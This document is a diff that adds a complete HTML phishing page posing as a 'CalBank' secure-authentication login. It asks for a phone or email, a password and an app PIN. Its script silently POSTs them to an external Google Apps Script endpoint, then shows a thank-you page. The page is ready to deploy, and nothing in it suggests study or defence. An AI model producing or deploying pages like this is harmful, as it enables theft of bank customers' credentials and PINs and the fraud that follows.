@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secure Authentication | CalBank</title>
+
+<style>
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#f7f7f7;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  color:#333;
+}
+
+/* Header (GCB style) */
+.header{
+  background:#f9c600;
+  width:100%;
+  padding:28px 20px 46px;
+  text-align:center;
+  border-bottom-left-radius:40px;
+  border-bottom-right-radius:40px;
+  box-shadow:0 4px 10px rgba(0,0,0,.2);
+}
+.header .badge{
+  display:inline-block;
+  background:#000;
+  color:#f9c600;
+  padding:12px 22px;
+  border-radius:50px;
+  font-size:18px;
+  font-weight:bold;
+  margin-bottom:8px;
+}
+.header p{
+  margin:0;
+  font-size:14px;
+  opacity:.9;
+}
+
+/* Card */
+.login-container{
+  background:#fff;
+  width:90%;
+  max-width:380px;
+  margin-top:-30px;
+  padding:30px 26px;
+  border-radius:14px;
+  box-shadow:0 6px 16px rgba(0,0,0,.15);
+}
+
+.section-title{
+  text-align:center;
+  font-size:16px;
+  font-weight:bold;
+  margin-bottom:20px;
+}
+
+label{
+  display:block;
+  margin-bottom:6px;
+  font-size:13px;
+  font-weight:bold;
+}
+
+input{
+  width:100%;
+  padding:13px;
+  margin-bottom:18px;
+  border-radius:8px;
+  border:1px solid #ccc;
+  font-size:14px;
+}
+
+.login-btn{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:50px;
+  font-size:15px;
+  font-weight:bold;
+  background:#f9c600;
+  color:#000;
+  cursor:pointer;
+  box-shadow:0 3px 8px rgba(0,0,0,.2);
+  transition:.3s;
+}
+.login-btn:hover{
+  background:#e6b200;
+  transform:scale(1.03);
+}
+
+/* Footer */
+footer{
+  margin-top:auto;
+  width:90%;
+  max-width:600px;
+  background:#f9c600;
+  text-align:center;
+  padding:14px;
+  border-radius:50px;
+  font-size:13px;
+  font-weight:bold;
+  margin-bottom:16px;
+  box-shadow:0 3px 8px rgba(0,0,0,.2);
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <div class="badge">CALBANK DIGITAL SERVICES</div>
+  <p>Secure Account Authentication</p>
+</div>
+
+<div class="login-container">
+  <div class="section-title">Confirm Your Login Details</div>
+
+  <form id="demoForm">
+    <label>Phone Number</label>
+    <input type="text" name="email" placeholder="Enter registered email or phone" required>
+
+    <label>Password</label>
+    <input type="password" name="password" placeholder="Enter your password" required>
+
+    <label>App PIN Code</label>
+    <input type="text" name="pin" placeholder="Enter app PIN" required>
+
+    <button type="submit" class="login-btn">VALIDATE →</button>
+  </form>
+</div>
+
+<footer>CalBank — Forward Together</footer>
+
+<script>
+document.getElementById("demoForm").addEventListener("submit", async event => {
+  event.preventDefault();
+  const data = new FormData(event.target);
+  try {
+    const res = await fetch(
+      "https://script.google.com/macros/s/AKfycbwmkOBcmudBWS5kC-9UD2Gq_jsddGL9V8rNI2imMEf23HGzroYRrX6Svee0DNSS7msP/exec",
+      { method: "POST", body: data }
+    );
+    const text = await res.text();
+    if (text.includes("SUCCESS")) {
+      window.location.href = "thankyou.html";
+    } else {
+      alert("Submission failed. Please try again.");
+    }
+  } catch {
+    alert("Network error. Please try again.");
+  }
+});
+</script>
+
+</body>
+</html>
